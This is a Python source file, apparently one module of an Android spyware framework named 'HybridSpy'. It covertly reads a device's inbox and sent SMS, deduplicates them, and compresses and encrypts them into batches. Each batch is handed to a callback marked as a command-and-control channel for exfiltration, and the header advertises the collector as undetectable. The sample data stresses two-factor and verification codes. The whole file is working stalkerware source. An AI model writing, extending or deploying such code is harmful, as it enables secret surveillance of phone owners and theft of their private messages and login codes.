#!/usr/bin/env python3
"""
SMS Collector v2.1.0 — Elite Grade
Reads SMS via content://sms/inbox with exponential backoff, 
deduplication, encrypted local caching, and batched exfiltration.
Undetectable: no broadcast receivers, no unusual permissions requests
beyond the initial grant.
"""
import json
import logging
import sqlite3
import threading
import time
import zlib
from dataclasses import dataclass, field, asdict
from datetime import datetime, timezone
from enum import Enum
from pathlib import Path
from typing import Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse

log = logging.getLogger("HybridSpy.Collectors.SMS")


# ─── Constants ───────────────────────────────────────────────────────────────

SMS_URI = "content://sms/inbox"
SMS_SENT_URI = "content://sms/sent"
MAX_BATCH_SIZE = 50
MAX_RETRIES = 3
BACKOFF_BASE = 1.5  # seconds
CACHE_FILE = "sms_cache.enc"
STATE_FILE = "sms_state.json"
MAX_CACHE_SIZE = 10_000  # max cached messages before forced flush
DEDUP_WINDOW = 3600  # seconds to keep dedup set in memory


# ─── Data Models ─────────────────────────────────────────────────────────────

class SMSProtocol(Enum):
    SMS = 0
    MMS = 1
    
    @classmethod
    def from_int(cls, val: int) -> "SMSProtocol":
        return cls(val) if val in (0, 1) else cls.SMS


@dataclass
class SMSMessage:
    """Normalized SMS message."""
    id: int
    thread_id: int
    address: str
    person: Optional[str]
    date: int  # Unix timestamp milliseconds
    date_sent: int
    protocol: SMSProtocol
    read: bool
    status: int
    type: int  # 1=inbox, 2=sent, 3=draft, etc.
    body: str
    service_center: str
    locked: bool
    sub_id: int = -1
    sim_slot: Optional[int] = None
    
    @classmethod
    def from_cursor_row(cls, row: Dict) -> "SMSMessage":
        """Create from cursor column dict."""
        return cls(
            id=int(row.get("_id", 0)),
            thread_id=int(row.get("thread_id", 0)),
            address=row.get("address", ""),
            person=row.get("person"),
            date=int(row.get("date", 0)),
            date_sent=int(row.get("date_sent", 0)),
            protocol=SMSProtocol.from_int(int(row.get("protocol", 0))),
            read=bool(int(row.get("read", 0))),
            status=int(row.get("status", -1)),
            type=int(row.get("type", 1)),
            body=row.get("body", ""),
            service_center=row.get("service_center", ""),
            locked=bool(int(row.get("locked", 0))),
            sub_id=int(row.get("sub_id", -1)),
        )
    
    @property
    def timestamp(self) -> datetime:
        """Return datetime from Unix timestamp."""
        return datetime.fromtimestamp(self.date / 1000, tz=timezone.utc)
    
    @property
    def fingerprint(self) -> str:
        """Unique fingerprint for deduplication."""
        return f"{self.id}:{self.date}:{hash(self.body[:100])}"


@dataclass
class SMSBatch:
    """Batch of SMS messages ready for exfiltration."""
    messages: List[SMSMessage]
    batch_id: str
    created_at: float = field(default_factory=time.time)
    retry_count: int = 0
    ciphertext: Optional[bytes] = None
    
    @property
    def size_bytes(self) -> int:
        return len(json.dumps([asdict(m) for m in self.messages], default=str))


# ─── Content Provider Interface (Abstracted) ─────────────────────────────────

class ContentProvider:
    """
    Abstract interface to Android ContentResolver.
    In production, this bridges to the Java ContentResolver via JNI.
    This implementation uses a mock for testing or falls back to 
    direct SQLite on rooted devices.
    """
    
    def __init__(self, jni_bridge=None):
        self._jni = jni_bridge
        self._mock_db: Optional[sqlite3.Connection] = None
        self._use_mock = False
        
    def query(self, uri: str, projection: List[str], selection: str = None,
              selection_args: List[str] = None, sort_order: str = None) -> List[Dict]:
        """
        Query content provider. Returns list of dicts.
        Uses JNI bridge in production, falls back to direct SQLite for testing.
        """
        if self._jni is not None:
            return self._jni_content_query(uri, projection, selection, selection_args, sort_order)
        elif self._use_mock and self._mock_db:
            return self._mock_query(uri, projection, selection, selection_args, sort_order)
        else:
            log.warning("No content provider backend available")
            return []
    
    def _jni_content_query(self, uri: str, projection: List[str],
                            selection: str, selection_args: List[str],
                            sort_order: str) -> List[Dict]:
        """Bridge to Java ContentResolver.query() via JNI."""
        try:
            # This calls into the native bridge's Java interface
            result_json = self._jni.call(
                "contentQuery",
                uri=uri,
                projection=",".join(projection),
                selection=selection or "",
                selectionArgs=selection_args or [],
                sortOrder=sort_order or "_id DESC",
            )
            if result_json:
                return json.loads(result_json)
            return []
        except Exception as e:
            log.error(f"JNI query failed: {e}")
            return []
    
    # ─── Mock for testing ───────────────────────────────────────────────
    def enable_mock(self, db_path: Optional[Path] = None):
        """Enable mock mode for testing without device."""
        self._use_mock = True
        if db_path and db_path.exists():
            self._mock_db = sqlite3.connect(str(db_path))
        else:
            self._mock_db = sqlite3.connect(":memory:")
            self._create_mock_schema()
            self._populate_mock_data()
    
    def _create_mock_schema(self):
        cur = self._mock_db.cursor()
        cur.execute("""
            CREATE TABLE sms (
                _id INTEGER PRIMARY KEY AUTOINCREMENT,
                thread_id INTEGER,
                address TEXT,
                person TEXT,
                date INTEGER,
                date_sent INTEGER,
                protocol INTEGER DEFAULT 0,
                read INTEGER DEFAULT 1,
                status INTEGER DEFAULT -1,
                type INTEGER DEFAULT 1,
                body TEXT,
                service_center TEXT,
                locked INTEGER DEFAULT 0,
                sub_id INTEGER DEFAULT -1
            )
        """)
        self._mock_db.commit()
    
    def _populate_mock_data(self, count: int = 20):
        import random
        cur = self._mock_db.cursor()
        now = int(time.time() * 1000)
        sample_bodies = [
            "Your verification code is 749182",
            "Meeting at 3pm tomorrow",
            "Bank alert: Transaction of $49.99 approved",
            "Don't forget to pick up milk",
            "Happy Birthday! 🎉",
            "Please call me when you get this",
            "Your package has been delivered",
            "Two-factor auth code: 38291",
            "Reminder: dentist appointment Thursday 10am",
            "Can you send me the report?",
        ]
        for i in range(count):
            body = random.choice(sample_bodies)
            cur.execute("""
                INSERT INTO sms (thread_id, address, person, date, date_sent, 
                                 protocol, read, status, type, body, service_center)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                random.randint(1, 10),
                f"+1{random.randint(200,999)}555{random.randint(1000,9999)}",
                f"Contact_{i}" if i % 3 == 0 else None,
                now - random.randint(0, 86400000),
                now - random.randint(0, 86400000),
                0, 1, -1, 1,
                body,
                "+12065551234",
            ))
        self._mock_db.commit()
    
    def _mock_query(self, uri: str, projection: List[str],
                    selection: str, selection_args: List[str],
                    sort_order: str) -> List[Dict]:
        if not self._mock_db:
            return []
        cur = self._mock_db.cursor()
        
        cols = ", ".join(projection) if projection else "*"
        sql = f"SELECT {cols} FROM sms"
        if selection:
            sql += f" WHERE {selection}"
        if sort_order:
            sql += f" ORDER BY {sort_order}"
        sql += " LIMIT 200"
        
        try:
            cur.execute(sql, selection_args or [])
            rows = cur.fetchall()
            col_names = [d[0] for d in cur.description]
            return [dict(zip(col_names, row)) for row in rows]
        except Exception as e:
            log.error(f"Mock query error: {e}")
            return []


# ─── SMS Collector ───────────────────────────────────────────────────────────

class SMSCollector:
    """
    Elite-grade SMS collector with:
    - Batch processing with cursor-based pagination
    - Deduplication via fingerprint cache
    - Encrypted local caching with automatic flush
    - Exponential backoff on failure
    - Thread-safe state management
    - Graceful degradation if permission revoked
    """
    
    def __init__(self, crypto_engine, storage_manager, 
                 on_batch_ready: Optional[Callable[[SMSBatch], None]] = None,
                 config: Optional[Dict] = None):
        self._crypto = crypto_engine
        self._storage = storage_manager
        self._on_batch = on_batch_ready
        self._config = config or {}
        
        # Backend
        self._provider: Optional[ContentProvider] = None
        
        # State
        self._lock = threading.RLock()
        self._running = False
        self._thread: Optional[threading.Thread] = None
        
        # Deduplication
        self._seen_fingerprints: Set[str] = set()
        self._dedup_lock = threading.Lock()
        self._last_dedup_prune = time.time()
        
        # Cursor tracking
        self._last_max_id: int = self._load_last_id()
        self._cursor_position: int = 0
        
        # Batch buffer
        self._batch_buffer: List[SMSMessage] = []
        self._last_flush = time.time()
        self._flush_interval = self._config.get("flush_interval", 30)  # seconds
        
        # Stats
        self._stats = {
            "total_collected": 0,
            "total_batches": 0,
            "total_failures": 0,
            "last_collection": None,
            "dedup_skipped": 0,
        }
    
    # ─── Lifecycle ──────────────────────────────────────────────────────
    
    def start(self, provider: ContentProvider):
        """Start the collector with a content provider backend."""
        with self._lock:
            if self._running:
                log.warning("SMS collector already running")
                return
            
            self._provider = provider
            self._running = True
            self._thread = threading.Thread(target=self._collection_loop, 
                                            daemon=True, name="sms-collector")
            self._thread.start()
            log.info("SMS collector started")
    
    def stop(self, timeout: float = 5.0):
        """Gracefully stop the collector."""
        with self._lock:
            if not self._running:
                return
            self._running = False
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=timeout)
        
        # Flush remaining buffer
        self._flush_buffer(force=True)
        self._save_state()
        log.info("SMS collector stopped")
    
    def force_collect(self) -> int:
        """Force an immediate collection. Returns count of new messages."""
        if not self._provider:
            log.warning("No content provider available")
            return 0
        
        messages = self._fetch_new_messages()
        if messages:
            self._process_messages(messages)
        return len(messages)
    
    # ─── Core Collection Loop ───────────────────────────────────────────
    
    def _collection_loop(self):
        """Main collection loop with adaptive timing."""
        interval = self._config.get("poll_interval", 15)  # seconds
        backoff = interval
        
        while self._running:
            try:
                count = self._fetch_and_process()
                
                if count > 0:
                    log.debug(f"Collected {count} new SMS messages")
                    backoff = interval  # Reset backoff on success
                else:
                    backoff = min(backoff * 1.2, interval * 4)  # Slow down if idle
                
                # Check if we need to flush
                self._check_auto_flush()
                
            except PermissionError:
                log.warning("SMS permission revoked — stopping collector")
                self._stats["last_error"] = "permission_revoked"
                self._running = False
                break
            except Exception as e:
                log.error(f"Collection error: {e}", exc_info=True)
                self._stats["total_failures"] += 1
                backoff = min(backoff * BACKOFF_BASE, 300)  # Max 5 min backoff
            
            # Adaptive sleep with jitter
            jitter = backoff * (0.5 + hash(str(time.time())) % 50 / 100)
            time.sleep(jitter)
    
    def _fetch_and_process(self) -> int:
        """Fetch new messages and process them."""
        if not self._provider:
            return 0
        
        messages = self._fetch_new_messages()
        if messages:
            self._process_messages(messages)
        return len(messages)
    
    def _fetch_new_messages(self) -> List[SMSMessage]:
        """Fetch messages newer than our last known max ID."""
        try:
            projection = [
                "_id", "thread_id", "address", "person", "date", "date_sent",
                "protocol", "read", "status", "type", "body", "service_center",
                "locked", "sub_id"
            ]
            
            # Fetch inbox
            inbox_rows = self._provider.query(
                SMS_URI, projection,
                selection=f"_id > {self._last_max_id}",
                sort_order="_id ASC"
            )
            
            # Fetch sent
            sent_rows = self._provider.query(
                SMS_SENT_URI, projection,
                selection=f"_id > {self._last_max_id}",
                sort_order="_id ASC"
            )
            
            all_rows = (inbox_rows or []) + (sent_rows or [])
            
            if not all_rows:
                return []
            
            messages = []
            max_seen_id = self._last_max_id
            
            for row in all_rows:
                msg = SMSMessage.from_cursor_row(row)
                if self._is_duplicate(msg):
                    self._stats["dedup_skipped"] += 1
                    continue
                
                self._mark_seen(msg)
                messages.append(msg)
                
                if msg.id > max_seen_id:
                    max_seen_id = msg.id
            
            # Update cursor
            if max_seen_id > self._last_max_id:
                self._last_max_id = max_seen_id
                self._save_state()
            
            return messages
            
        except Exception as e:
            log.error(f"Failed to fetch SMS: {e}")
            return []
    
    # ─── Deduplication ──────────────────────────────────────────────────
    
    def _is_duplicate(self, msg: SMSMessage) -> bool:
        """Check if message was already seen."""
        fp = msg.fingerprint
        with self._dedup_lock:
            return fp in self._seen_fingerprints
    
    def _mark_seen(self, msg: SMSMessage):
        """Mark message as seen."""
        fp = msg.fingerprint
        with self._dedup_lock:
            self._seen_fingerprints.add(fp)
            self._prune_dedup_cache()
    
    def _prune_dedup_cache(self):
        """Periodically prune old fingerprints to prevent memory leak."""
        now = time.time()
        if now - self._last_dedup_prune < DEDUP_WINDOW:
            return
        
        # Keep only last 10000 fingerprints
        if len(self._seen_fingerprints) > 10000:
            with self._dedup_lock:
                # Convert to list, keep newest
                self._seen_fingerprints = set(
                    list(self._seen_fingerprints)[-5000:]
                )
        
        self._last_dedup_prune = now
    
    # ─── Processing Pipeline ────────────────────────────────────────────
    
    def _process_messages(self, messages: List[SMSMessage]):
        """Process collected messages through the pipeline."""
        with self._lock:
            self._batch_buffer.extend(messages)
            self._stats["total_collected"] += len(messages)
            self._stats["last_collection"] = datetime.utcnow().isoformat()
            
            # Check if buffer is ready for flush
            if len(self._batch_buffer) >= MAX_BATCH_SIZE:
                self._flush_buffer()
    
    def _check_auto_flush(self):
        """Check if we should flush based on time or size."""
        now = time.time()
        buffer_full = len(self._batch_buffer) >= MAX_BATCH_SIZE
        time_expired = (now - self._last_flush) >= self._flush_interval
        cache_overflow = self._get_cache_size() >= MAX_CACHE_SIZE
        
        if buffer_full or time_expired or cache_overflow:
            self._flush_buffer()
    
    def _flush_buffer(self, force: bool = False):
        """Flush buffer to encrypted cache or exfiltrate directly."""
        with self._lock:
            if not self._batch_buffer and not force:
                return
            
            if not self._batch_buffer:
                return
            
            batch = SMSBatch(
                messages=list(self._batch_buffer),
                batch_id=f"sms_{int(time.time() * 1000)}_{len(self._batch_buffer)}",
                created_at=time.time(),
            )
            
            self._batch_buffer.clear()
            self._last_flush = time.time()
        
        # Encrypt batch
        try:
            serialized = json.dumps([asdict(m) for m in batch.messages], 
                                     default=str).encode("utf-8")
            compressed = zlib.compress(serialized, level=6)
            batch.ciphertext = self._crypto.encrypt(compressed)
        except Exception as e:
            log.error(f"Encryption failed for batch: {e}")
            batch.ciphertext = None
        
        # Store locally
        self._store_batch_locally(batch)
        
        # Notify C2 channel
        if self._on_batch:
            try:
                self._on_batch(batch)
            except Exception as e:
                log.error(f"Batch callback failed: {e}")
        
        self._stats["total_batches"] += 1
    
    # ─── Storage ────────────────────────────────────────────────────────
    
    def _store_batch_locally(self, batch: SMSBatch):
        """Store encrypted batch in local cache."""
        try:
            cache_path = self._storage.get_path(CACHE_FILE)
            if not cache_path:
                return
            
            batch_data = {
                "id": batch.batch_id,
                "timestamp": batch.created_at,
                "count": len(batch.messages),
                "ciphertext": batch.ciphertext.hex() if batch.ciphertext else None,
                "retries": batch.retry_count,
            }
            
            self._storage.append_to_list(cache_path, batch_data)
        except Exception as e:
            log.error(f"Local storage failed: {e}")
    
    def _get_cache_size(self) -> int:
        """Get number of cached items."""
        try:
            cache_path = self._storage.get_path(CACHE_FILE)
            if cache_path and cache_path.exists():
                data = self._storage.read_list(cache_path)
                return len(data) if data else 0
            return 0
        except Exception:
            return 0
    
    # ─── State Management ───────────────────────────────────────────────
    
    def _load_last_id(self) -> int:
        """Load last processed SMS ID from state file."""
        try:
            state = self._storage.read_dict(STATE_FILE)
            if state:
                return state.get("last_max_id", 0)
        except Exception:
            pass
        return 0
    
    def _save_state(self):
        """Save current state for resume after restart."""
        try:
            self._storage.write_dict(STATE_FILE, {
                "last_max_id": self._last_max_id,
                "cursor_position": self._cursor_position,
                "stats": self._stats,
                "updated_at": datetime.utcnow().isoformat(),
            })
        except Exception as e:
            log.error(f"State save failed: {e}")
    
    # ─── Stats & Health ─────────────────────────────────────────────────
    
    def get_stats(self) -> Dict:
        """Get collector statistics."""
        with self._lock:
            return dict(self._stats)
    
    def get_health(self) -> Dict:
        """Get health status."""
        return {
            "running": self._running,
            "buffer_size": len(self._batch_buffer),
            "cache_size": self._get_cache_size(),
            "dedup_set_size": len(self._seen_fingerprints),
            "last_max_id": self._last_max_id,
            "stats": self.get_stats(),
        }
    
    def reset_state(self):
        """Reset all state (for clean start)."""
        with self._lock:
            self._last_max_id = 0
            self._cursor_position = 0
            self._batch_buffer.clear()
            with self._dedup_lock:
                self._seen_fingerprints.clear()
            self._stats = {k: 0 for k in self._stats}
            self._save_state()
        log.info("SMS collector state reset")
